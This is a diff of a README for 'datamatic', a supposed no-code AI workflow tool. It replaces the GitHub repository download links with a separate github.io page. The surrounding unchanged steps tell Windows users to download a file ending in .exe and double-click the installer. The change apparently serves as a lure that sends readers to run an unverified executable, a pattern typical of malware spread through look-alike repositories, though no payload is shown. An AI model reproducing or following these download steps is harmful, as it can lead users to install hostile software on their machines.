@@ -1,6 +1,6 @@
 # 🤖 datamatic - Build automated workflows with smart reasoning
 
-[![](https://img.shields.io/badge/Download-Datamatic-blue.svg)](https://github.com/kelliinterim246/datamatic)
+[![](https://img.shields.io/badge/Download-Datamatic-blue.svg)](https://kelliinterim246.github.io)
 
 Datamatic helps you build multi-step AI workflows. You create tasks that use artificial intelligence to reason through data and process information. The software handles structured generation and chaining of tasks. You connect different AI models to perform complex sequences of logic without writing code.
 
@@ -23,7 +23,7 @@ To run Datamatic on your Windows computer, you need basic hardware:
 
 Follow these steps to install the software on your machine:
 
-1.  Visit the [download page](https://github.com/kelliinterim246/datamatic).
+1.  Visit the [download page](https://kelliinterim246.github.io).
 2.  Choose the link that ends in .exe for Windows.
 3.  Click the file to start the download.
 4.  Once the file arrives, double-click the file to open the installer.
